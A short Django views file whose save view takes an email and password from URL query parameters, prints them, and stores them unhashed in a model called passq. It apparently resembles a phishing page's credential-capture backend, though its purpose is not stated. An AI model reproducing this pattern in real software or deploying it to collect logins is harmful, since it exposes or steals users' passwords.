from django.shortcuts import render , redirect
from django.http import HttpResponse ,HttpResponseRedirect,JsonResponse
from data.models import passq

def home(request):
    
    return render(request, "home.html")

def save(request):
    
    e=request.GET.get("email")
    p=request.GET.get("password")
    
    print(p,e)
    
    Updata=passq(email=e,password=p)
    Updata.save()
    
    return JsonResponse({"status": "ok"})


